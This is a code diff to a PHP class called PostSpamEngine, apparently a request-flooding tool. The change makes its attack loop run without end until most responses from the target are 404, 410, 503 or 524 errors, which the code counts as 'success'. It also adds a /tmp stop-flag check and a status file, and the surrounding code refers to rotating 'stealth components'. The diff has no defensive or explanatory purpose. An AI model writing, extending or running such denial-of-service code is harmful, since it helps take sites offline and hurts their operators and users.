@@ -59,7 +59,17 @@ class PostSpamEngine {
         $successCount = 0;
         $errorCodes = [];
         
-        while (time() < $endTime) {
+        while (true) {
+            if ($this->shouldStop($groupId)) {
+                $this->logMessage("Manual stop signal received for group: $groupId");
+                break;
+            }
+            
+            if ($this->isSuccessConditionMet($target, $groupId, $errorCodes)) {
+                $this->logMessage("Success condition met for target: $target in group: $groupId");
+                break;
+            }
+            
             $batchResults = $this->executeBatch($target, $groupId, $profile);
             
             $requestCount += $batchResults['requests'];
@@ -310,6 +320,43 @@ class PostSpamEngine {
         } catch (Exception $e) {
             $this->logMessage("Failed to rotate stealth components: " . $e->getMessage());
         }
+    }
+    
+    private function shouldStop($groupId) {
+        $stopFile = "/tmp/stop_signal_$groupId.flag";
+        return file_exists($stopFile);
+    }
+    
+    private function isSuccessConditionMet($target, $groupId, $errorCodes) {
+        if (empty($errorCodes)) return false;
+        
+        $totalRequests = array_sum($errorCodes);
+        if ($totalRequests < 100) return false;
+        
+        $successCodes = [404, 410, 503, 524];
+        $successCount = 0;
+        
+        foreach ($successCodes as $code) {
+            $successCount += $errorCodes[$code] ?? 0;
+        }
+        
+        $successRate = $successCount / $totalRequests;
+        
+        if ($successRate >= 0.75) {
+            $statusFile = "/tmp/success_status_$groupId.json";
+            $status = [
+                'target' => $target,
+                'success_rate' => $successRate,
+                'total_requests' => $totalRequests,
+                'success_count' => $successCount,
+                'timestamp' => time(),
+                'condition_met' => true
+            ];
+            file_put_contents($statusFile, json_encode($status));
+            return true;
+        }
+        
+        return false;
     }
     
     private function logMessage($message) {
